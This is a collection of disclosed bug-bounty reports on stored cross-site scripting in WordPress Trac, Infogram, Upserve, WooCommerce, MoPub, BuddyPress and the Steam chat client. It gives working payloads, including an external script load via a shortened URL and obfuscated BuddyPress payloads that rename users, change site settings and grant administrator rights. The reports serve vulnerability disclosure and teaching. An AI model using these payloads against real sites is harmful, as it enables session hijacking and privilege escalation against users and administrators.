- **Report ID:** `643908`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** WordPress
- **Reporter:** @ali
- **Bounty:** - usd
- **Disclosed:** 2019-07-18T20:25:18.832Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,
I found a stored xss @ https://core.trac.wordpress.org/

Steps:
1. Go to https://core.trac.wordpress.org/ and login. (open new private window and login with another account)
2. Go to https://core.trac.wordpress.org/newticket and set a summary and description.
3. Select a Workflow Keyword and click manual. Paste the payload: "><svg/onload=alert(document.domain)>
4. Click enter button and click Create Ticket button. Now, you will see xss alert.
Copy the url and go to private window. Go to url and you will see xss alert.

PoC: https://youtu.be/Nyt1op_73vs

## Impact

Stealing cookies

**Summary (team):**

Ali found a stored XSS vulnerability in the JavaScript implementation of workflow keywords on our Trac instance. The issue was caused by using unescaped user input to generate a delete button. [A fix has been implemented](https://meta.trac.wordpress.org/changeset/9048) to use the safe jQuery method `.attr()` instead.

---

Important: As mentioned in our [policy](https://hackerone.com/wordpress), **do not pentest our Trac instances**, it's very annoying to clean up after. Setup a local environment instead; the custom source code is available via Git (`git clone git://meta.git.wordpress.org/`), in the trac.wordpress.org subfolder. **If you ignore this you'll forfeit any bounty.**

**Summary (researcher):**

I love bug bounty.
I love xss.
https://twitter.com/alicanact60

---

### [Stored XSS in infogram.com via language ](https://hackerone.com/reports/430029)

- **Report ID:** `430029`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Infogram
- **Reporter:** @theappsec
- **Bounty:** - usd
- **Disclosed:** 2019-06-22T07:54:17.827Z
- **CVE(s):** -

**Vulnerability Information:**

The stored XSS was found in the language profile parameter.

POC:
Change profile settings with following request:

```http
PUT /api/users/me HTTP/1.1
Host: infogram.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
csrf-token: **your token**
X-Requested-With: XMLHttpRequest
Content-Length: 135
DNT: 1
Connection: close
Cookie: **your cookies**

first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//
```
Go to your public profile link.

example: https://infogram.com/dd_ddt7

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.

---

### [Ability to create own account UUID leads to stored XSS](https://hackerone.com/reports/249131)

- **Report ID:** `249131`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Upserve 
- **Reporter:** @cache-money
- **Bounty:** 1500 usd
- **Disclosed:** 2019-06-10T15:50:36.553Z
- **CVE(s):** -

**Vulnerability Information:**

I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.

This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.

**PoC**
Just replace the email with the one you own, and click the email confirmation link.
```
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

**Live PoC**
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002

The generated HTML looks like:
`YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,`

Thanks,
-- Tanner

**Summary (team):**

The server allows the client to create and submit its own UUID which was not validated. This resulted in the ability to create a crafted XSS payload.

---

### [WooCommerce: Persistent XSS via customer address (state/county)](https://hackerone.com/reports/530499)

- **Report ID:** `530499`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @foobar7
- **Bounty:** - usd
- **Disclosed:** 2019-05-26T08:35:50.322Z
- **CVE(s):** -

**Vulnerability Information:**

Persistent XSS via customer address (state/county)
================================

CVSS
----

High 7.2 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N)

Description
-----------

The current version (3.5.7) of the WooCommerce WordPress plugin echoes the state/county of a customer in the admin backend without encoding, leading to persistent XSS.

For a successful attack, an attacker needs a customer account, though it is to be expected that account creation is available for users in a considerable amount of setups.

If the victim is an administrator on a default WordPress setup, an attacker can exploit the issue to gain code execution on the server by eg sending a request to edit a WordPress plugin file.

POC
---

Setup: Install the WooCommerce plugin & open registration / add a user (permissions do not matter, I used "customer"). 

To place the payload:

1. Login as a customer at http://192.168.0.101/wordpress/my-account/
2. To place a payload, either:
    - add an item to cart & proceed to checkout. Under "Billing Details", select UK as country and enter `'"><img src=x onerror=alert(1) x=y` as `County` (note the missing `>` which is required as tags are filtered).
    - Alternatively, simply change the address under account settings at `http://192.168.0.101/wordpress/my-account/edit-address/`.

To trigger the payload:

1. Go to `http://192.168.0.101/wordpress/wp-admin/users.php` and click on the customer, or directly visit `http://192.168.0.101/wordpress/wp-admin/user-edit.php?user_id=4`, where `4` is the customers ID.

## Impact

With a successful attack, an attacker can read data available to the attacked user or perform arbitrary request in the name of the attacked user. 

With a default setup, an attacker can gain code execution on the server by eg editing a WordPress plugin file.

---

### [Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm](https://hackerone.com/reports/411690)

- **Report ID:** `411690`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Alliance of American Football 
- **Reporter:** @gujjuboy10x00
- **Bounty:** - usd
- **Disclosed:** 2019-05-25T09:08:06.032Z
- **CVE(s):** -

**Vulnerability Information:**

Dear Team,

**Summary:** [add summary of the vulnerability]
After looking into https://shop.aaf.com/Order/step1/index.cfm i get to know that there is address field is vulnerable to stored xss which can lead to steal any user's cookie and can lead to complete account takeover

**Description:** [add more details about this vulnerability]

## Steps To Reproduce:

  1. go to https://shop.aaf.com and click on any products , tshirt
  2. add that in cart and click on proceed
  3. enter xss payload (a"><svg/onload=prompt(1)> ) in every address field and click on OK proceed
  4. xss will popup 

## Supporting Material/References:

XSS OWASP

Thanks,
Vishal

## Impact

Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm

---

### [Multiple XSS on account settings that can hijack any users in the company. ](https://hackerone.com/reports/503298)

- **Report ID:** `503298`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** X / xAI
- **Reporter:** @giddsec
- **Bounty:** 700 usd
- **Disclosed:** 2019-04-01T16:40:27.104Z
- **CVE(s):** -

**Vulnerability Information:**

### Note:
Hello Twitter Team, I just noticed that my report #485748 is already fixed, can you confirm? but my other duplicate reports aren't and still exists. #492444 #492913 are you sure it's on the **same root cause**? because I think the broad fix is already released but didn't fix the other issues.
I will make a report here so you'll notice. I will merge #492444 #492913 here. I'm also thinking for Twitter Security. I'm monitoring MoPub since report #485748 was set on triage. 

*The broad fix didn't really fixed all issues, that's why I'm resubmitting these issues.*

##Description: 
An issue that can be performed **vice versa**. That a member can hijack a admin or admin hijack a member by injecting a malicious scripts in the **accounts settings**.

##Steps to reproduce:

1. Login to MoPub: https://app.mopub.com/account/login/
2. Go to **account settings** (*almost everything here is vulnerable to XSS*)
3. Inject on **currency**
4. You can also inject on **company's information** (*every input is vulnerable to XSS*) 

**Cases of injecting on company's name** 
- When the victim go to **report's tab** XSS will trigger. (*even if the victim is on his/her original company, attacker's company still visible on email drop down menu.*)  
- When the victim go to **account settings** XSS will trigger.  
- When the victim go to **edit user settings** XSS will trigger.  

**Cases of injecting on currency**(vice versa attack)
- Administrator can inject malicious payload in **currency** can hijack member's session. (XSS triggers on member's end) 
- Member can inject malicious payload in **currency** can hijack administrator's session. (XSS triggers on administrator's end)

I provided a **Full Demonstration of the vulnerability**
F432851

**Based on Roles and Permissions:**
(Vice Versa Attack)

- Members can make changes in the account, but they cannot add new users, change other users' roles or view payment information. F432849

## Impact

This vulnerability can impact other users invited by the attacker. And it is Stored XSS that every time the victim visits the vulnerable endpoints, XSS will trigger. The impact here is the attacker can hijack the victim's session.

It's also a vice versa attack. the attacker could be the administrator or the member.

---

### [Stored XSS on reports.](https://hackerone.com/reports/485748)

- **Report ID:** `485748`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** X / xAI
- **Reporter:** @giddsec
- **Bounty:** 700 usd
- **Disclosed:** 2019-04-01T16:39:45.718Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
Stored XSS can be submitted on reports, and anyone who will check the report the XSS will trigger. 

**Description:**
Stored XSS, also known as persistent XSS, is the more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application. 

## Steps To Reproduce:

  1. Go to https://app.mopub.com/reports/custom/
  2. Click **New network report**.
  3. On the name, enter payload: **"><img src=x onerror=alert(document.domain)>**
  4. Click **Run and save** then XSS will trigger. 

**Demonstration of the vulnerability:**
PoC: ████


Tested on Firefox and chrome.

## Impact

The attacker can steal data from whoever checks the report.

---

### [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081)

- **Report ID:** `487081`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** WordPress
- **Reporter:** @klmunday
- **Bounty:** - usd
- **Disclosed:** 2019-03-08T22:28:04.374Z
- **CVE(s):** -

**Vulnerability Information:**

## Description:
WordPress version: **5.0.3**
BuddyPress version: **4.1.0**

Users with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc. The XSS is stored in the database and is triggered any time a user reads the message. This includes the message preview window which shows the last message the user has received (or sent).

The code which runs can be exploited to perform any action that the "Victim" has permissions for, this is especially dangerous for privileged users such as administrators since it allows access to the WordPress settings and private information such as users emails. This includes any actions for other plugins etc.

The only prerequisites for this is that private messaging is enabled in the BuddyPress settings and that the attacker has an account (with default permissions).

## Steps To Reproduce:
Via composing a new message
1. Go to another users profile
2. Click private message
3. Type any subject
4. Type the following message  `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
5. Send the message
6. View the message (triggers the XSS)
7. Wait for the victim to read the message

Via replying to an existing thread
1. Go to your inbox
2. View any message you have received
3. Respond to the message with `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
4. View the message (triggers the XSS)
5. Wait for the victim to read the message

Payloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and eval'd:
**example:**
```
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```
**would run**
```javascript
let test = 123;
alert(test);
```

Larger payloads can be used. However, due to the code needing to be in an array of char codes (if it contains spaces or quotations) I have written a small python script to convert javascript code into a sendable message. It also includes some Proof of concept payloads which perform the following:
- Change the users username to `HACKED` (affects any user)
- Change the websites title and description (requires a privileged user to read the message)
- Change a users permissions to administrator (requires a privileged user to read the message)

Please see the attached zip file for the script and payloads (they have not been pre-converted)

See some example payloads below: 
(note: the spacing is to prevent the iframe element being visible in the message exert displayed in the inbox - it is not required for it to work, nor is the start of the message, only the iframe is needed).
**Change username to `HACKED`**
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;></iframe>
```

**Change site title and description:** (requires admin to read message)
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,45,103,101,110,101,114,97,108,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,110,97,109,101,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,116,105,116,108,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,100,101,115,99,114,105,112,116,105,111,110,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,46,112,104,112,39,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
```

**Change user permissions for the user with id `2` to administrator** (requires admin to read message)
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,115,101,108,101,99,116,91,110,97,109,101,61,34,114,111,108,101,34,93,39,41,46,112,114,111,112,40,34,115,101,108,101,99,116,101,100,73,110,100,101,120,34,44,32,52,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
```

For a more detailed write-up including images please view this [Google Doc (unlisted)](https://docs.google.com/document/d/1RgMWJlYen9iR_JTxATYR4TJWAPKRgaSKuiiqZp7x8L0/edit?usp=sharing) (if this is not allowed please let me know so that I can include them here if necessary)

## Impact

An attacker could craft a payload to perform any action which their target can perform. This is especially dangerous for administrators since if the attacker targeted them they could modify site data/content, modify accounts, read sensitive information such as users private information and more.

In my testing I was able to change profile names, change users passwords, read users email addresses, modify pages, modify the site data and modify the WordPress settings including the sites email address.

I did not find anything I could not exploit which the targeted user had permissions to do, it seems depending on the target that the attacker can achieve full access to wp-admin and any other plugins that are installed and even chain requests together within a single attack.

It would also be possible to create a worm which when read would email its content to every other user again.

---

### [XSS in steam react chat client](https://hackerone.com/reports/409850)

- **Report ID:** `409850`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Valve
- **Reporter:** @zemnmez
- **Bounty:** 7500 usd
- **Disclosed:** 2019-01-07T20:00:19.267Z
- **CVE(s):** -

**Vulnerability Information:**

The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS.

This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.

## Impact

I strongly believe an attacker could get remote code execution in Steam via this method. The Steam chat client uses the same codebase as the steam web chat client, and, I imagine does so using electron or some other webview system. These systems all expose functions which allow arbitrary calls to system to allow them to be competitive with e.g. windows forms.

**Summary (researcher):**

# 1. Background
The Steam Chat client is a particularly interesting system to attack because it's built using a modern set of technologies with strong security characteristics.

It's built on React, which has some of the strongest security characteristics of any modern Javascript application framework, and avoids use of the unsafe `dangerously` family of functions well.

Content Security Policy is deployed, although with `unsafe-inline`. This is a minor inconvenience but an interesting step forward.

The Chat client, unlike most desktop applications using web technologies runs in a custom, highly locked down build of Chrome Embedded Framework. In most Electron-like systems, privileged access is granted to the Javascript VM via the `window` object. The chat client takes the interesting and potentially much more secure approach of running at, in essence the privilege of a regular webpage allowing privileged actions only through PostMessage and a loopback WebSocket that communicates with the parent process.

The WebSocket carries a custom binary protocol that is very difficult to dissect over the wire and it's leveraged such that through some common bug I have yet to find root cause on Chrome Dev Tools crashes if breakpoints fire as the page loads (I think it's some kind of race that happens when WebWorkers are active and the Javascript assets are heavy).

The trend toward DOM heavy applications is interesting to me, as many in the security industry still rely heavily on HTTP proxies that aren't able to accurately reflect application state in these cases.

# 2. Techniques

## 2a. React Security Gotchas

Since the Steam Chat client is built on React, there's far fewer ways XSS is possible. There are a few ways I look for particularly:

- React does not special-case encode the attributes of any tags. Attributes with DOM manipulation properties are dangerous.

    It's very common to see `<a href>` attributes generated from user input where `javascript:` input URIs, when clicked will result in XSS. Hand-rolled countermeasures to `javascript:` URIs are still poor, and often employ URL parsers that are not intended to be used defensively.

    It's not uncommon to see `style` tags generated by string concatenation that include user input where an image, for example as a background URL can be injected to IP address information and tokens from the URL via Referer header. CSS sanitization isn't really a thing, even in the best contextually-aware XSS libraries. CSS-based attacks on the DOM that use `selector[value=string]` or that define fonts that make HTTP requests for each character to conditionally load resources and exfiltrate data are almost entirely unknown outside infosec circles.

- React doesn't attempt to provide hardened versions of other unsafe Javacript functionality, or disable them. It's common to see React applications use `document.location = xxx` to change the location of the browser which is also vulnerable to Javascript URI injection.

    In the same vein, requests to HTTP APIs don't gain enhanced security from React. It's still common to request data using user input spliced into a URL that's not encoded properly. React developers love to use fancy REST syntax to generate request paths like `"/user/" + encodeURIComponent(username) + "profile"`, even though to my knowledge there's no safe way to encode a URL path in vanilla Javascript. Even where `../` is encoded to `..%2F`, virtually all web servers ignore the lexical difference between `%2F` and `/`.

- Some protocols, like OEMBED are just unsafe by design by returning HTML. To use these APIs, React apps including this one *have* to use `dangerouslySetInnerHTML`. It's also not uncommon to see React refs used to get a handle on the generated element and `innerHTML` called directly, which can evade testers grepping for 'unsafe'.

    Protocols that return HTML, and even those that don't *still* routinely return `Content-Type: text/html`, which means that if a victim is navigated to an API result for example by submitting an HTML form even if the client would handle the output safely, the browser won't if an XSS exists.

## 2b. Advanced DevTools Features
I wanted to throw in a few DevTools features that my infosec friends don't use enough that I found instrumental to finding this bug. Hackerone doesn't support uploading images to summaries, so I'll link them instead.

### 2b I. The Console Drawer
https://zemn.me/misc/devtools_pullout.png
When you press escape with devtools open, a drawer pulls up from the bottom. From here, you can get access to some insanely powerful features while still browsing source code or network logs.

https://zemn.me/misc/devtools_pullout_console.png
The *most* insane feature is the pull-out console. When a breakpoint is fired and execution is paused, you can execute any code you want here and it will execute in the context of the current line the debugger is on. This is absolutely indispensable for modifying and inspecting code that operates at many levels of abstraction.

### 2b II. Code Search, Pretty Print

https://zemn.me/misc/devtools_search_steam.png
DevTools contains an extremely powerful search feature that searches every asset loaded into the current window. It can be accessed by the bottom drawer (click the three dots). If you find an element in the DOM and wonder how it's generated, you can search for it here and jump to where it's mentioned.

Once there, you'll likely want to hit the pretty print button {} in the bottom left and ctrl-f for anything in that file you might find interesting.

### 2b IV. Breaking on Events
https://zemn.me/misc/devtools_breakpoints.png

It's super common that you have some event you expect to happen, like an XHR or a postMessage but you don't know where the handler is defined. Do not worry! If you scroll to the bottom of the rightmost panel of Sources you can set breakpoints for XHR / fetch and event listeners.

### 2b V. The Call Stack

https://zemn.me/misc/devtools_callstack.png
In the 'Sources' panel, once a breakpoint fires, you get the full callstack up to the breakpoint on the right. Sure, you get this in most languages.

Let's say you know a user action calls an XHR eventually, but you want to find the high-level construction of the XHR request. If you set an XHR / fetch breakpoint you'll end up breaking deep in a library of some kind usually that provides little context.

You can actually now step back through the call stack by clicking on each call, viewing code, variables in scope and which file it's in as you go until you find something that looks specially written for this application. I find this indispensable for escaping library call hell in modern minified applications.

### 2b VI. Injecting Code
https://zemn.me/misc/devtools_conditional_breakpoint.png
While chrome devtools *does* have the ability to edit the code of Javascript in webpages on the fly, this doesn't work for minified code, because you cannot do this on pretty-printed files. You can, however use a special trick.

If you right-click on a line number you can use 'insert conditional breakpoint'. Conditional breakpoints are fully featured javascript that breaks when the statement is `true`. `console.log` always returns undefined, so if you want to inspect several values as a program runs, you can inject `console.log` calls to have their values printed to console, something that isn't possible with the similar but less effective 'watch' feature.

In systems that have a heartbeat, a breakpoint will often cause a disconnection. Using conditional breakpoints can allow you to add code without stopping execution and using the console.

### 2b VII. Network Search
https://zemn.me/misc/network_search.png
Sure you're getting some data from somewhere, but have no idea where? You can click the magnifying glass icon in the network panel to search full requests, responses and their headers.

### 2b VIII. Network Filter Expressions

In applications that send a lot of XHR requests, especially those that regularly poll it can quickly become impossible to navigate all the requests in the network panel. You can use [filter expressions](https://developers.google.com/web/tools/chrome-devtools/network-performance/reference#filter) to narrow down requests to those that you might find important.

### 2b IX. Copy as Curl

There's a ton of things you can do with devtools, but you generally can't bypass web security primitives like same-origin policy, and it's not at all easy to remake and customize requests. You can click on any request in the network panel and go to 'copy as curl' to get an exact replication of the request you can iterate on to mess with the request form.

# 3. Approach
In a typical, last-generation chat application, security issues are most likely to surface where HTML is generated from input text. After all, not only is parsing language a super hard problem but it's especially hard to provide the power of HTML features to the user without inadvertently allowing them control over the browser by manipulating these features.

## 3a. Recon

My first realisation was that the app deployed inside the Steam desktop app was the same as the online one at https://steamcommunity.com/chat, which made it much easier to inject DevTools into the testing flow.

After that, I spent a little time using chat with DevTools' Network panel open and observed that we weren't getting bombarded with XHR polling. This likely meant we were using a WebSocket. Refreshing the page with the Network panel open (you only see WebSocket connections if you see them open), I browsed to the WS panel and noted that the client was communicating over completely unintelligible binary frames.

Noticing that the chat system supported embedded content which is unbelievably difficult to implement securely, I started doing code searches for 'OEMBED' and other generic embedding systems that are super easy to get XSS on.

At this point, I discovered the application was a React app, and switched to, at least partially using the [React Chrome Extension](https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=en) to inspect the DOM. The extension makes it super easy to jump to the code which generates elements, and since React components express all the information they depend on as `props` (which can be inspected in the extension) I found it much easier to get a handle on application structure.

I did a few searches for `dangerously`, `innerHTML` etc, and set breakpoints on all those. I tried to then get those functions to fire by tracing the call stack up. `dangerously` was only really called for certain 'oembed elements' that could be sent by the chat server.

I set up breakpoints on XHRs & other events that were fired by loading OEMBED content, like YouTube. When these fired, I stepped back through the call stack to reach the function which sanitised user input and sent it to the chat servers via binary WebSocket.

## 3b. Reaching XSS

This proved to have surprising results. I'd end up with the breakpoints firing twice for each sent message: once when the user makes a send request, and the client writes an assumed server response to the DOM – and a second time when that was overwritten by the actual response the server sent back. These renders could differ significantly under certain circumstances, in particular when OEMBED was used.

If I send a Vimeo link in chat, the client renders that initially as an HTML link when the message is sent. Then, when the server updates the chat room, it'll replace the link with a BBCode (yes, bbcode!) [OEMBED] tag that is essentially just raw HTML.

I immediately jumped at this and, using a breakpoint after the call to sanitize user input of BBCode I tried sending OEMBED tags containing malicious HTML, hoping they would be reflected back by the server. However, the server would completely strip these tags before responding.

After some scanning of the code, I located the table that matched BBCode tags with their corresponding React components and sent every BBCode tag I saw with mixed results. Most tags were stripped out by the server, and many tags clearly needed attribute parameters `[imgur alt=]` etc I didn't know how to use.

I pivoted to trying to log the BBCode representation of all the rich text commands like rolling a random number or showing an image to little success. I discovered a small handful of tags I could send that would otherwise be stripped including `[url=xxx]`, `[code]`, and `[image]`. Image was heavily locked down and I found it nearly impossible to use it in a malicious way. `[code]` just safely generated `[code]` tags, but `[url=xxx]` *was* legitimately making links to anywhere, *including* `javascript:` URI links.

I immediately opened this report, saying that I'd reached XSS and this usually results in RCE in such clients. It turned out to be a lot more complex than that.

Sure, I had reached XSS and I could really mess with web browser users but the `javascript:` URI was found to actually be smartly stripped or not honoured by the custom Steam client browser. I started trying other approaches, knowing that I could form any URL.

## 3c. The Steam URI

Based on prior art, I started by using `steam://` URIs, which are unique to the steam client and can do a lot of bad stuff. Many years ago, in-browser `steam://` URIs were used to reach Remote Code Execution by installing, and then running a game and piping its carefully crafted logs to the startup folder.

I had minor success. In the Chat client, `steam://` URIs were executing in a privileged context browsers could not normally access. After the `steam://` security issues, valve added a prompt for if the URL was opened by an external system – if I send you `steam://open/440` in a web browser, it'll cause steam to confirm that you really want to open that game, but these links in the Steam chat client would cause no such confirmation.

I played around with making links that variously opened games on people's computers, reset their configurations, closed steam or opened systems on it like the steam console by running `steam://-console` or something. I don't remember what the actual URL is :p

## 3d. Abusing OEMBED

After much trying and headdesking I changed tack again and tried to target OEMBED specifically. Secure OEMBED systems are hard as hell to implement, so people usually just use a service like Embedly. Embedly's security comes from good use of iframe sandboxing, and whitelists. However, since we're not in a normal browser, being embedded gives you different privileges. If you're embedded in an Electron desktop app browser and the iframe isn't in a special `<WebView>`, one can still access all the dangerous electron APIs through our iframe's `window` object even if the iframe would be safe in a browser.

To abuse this, though I'd need to either (1) get whitelisted by embedly (impossible) or (2) find a javascript injection in a whitelisted embedly embed. In a stroke of luck, I remembered that codepen.io is whitelisted by embedly and codepen is, well literally Javascript injection as a service.

In the past, working in such contexts was something I literally did by injecting the script for FireBug, but this is usually a pain because stuff doesn't work quite right. [@mandatory](https://twitter.com/IAmMandatory) recommended I use a remote chrome console. He recommended me some software i completely forget the name of that lets you use a chrome dev tools remote console by injecting some scripts.

## 3e. Remote Console

Once I had loaded in Steam my codepen.io app with my remote console, I started looking for idiosyncrasies of the Steam Web Helper context. I started by dumping `Object.keys(window)` and running a diff off it against a normal Chrome browser. This came up with a few things, most of which were useless. I could hook an event for when some styles loaded on the page and other stuff that's not usually possible in the browser, but not really a security issue.

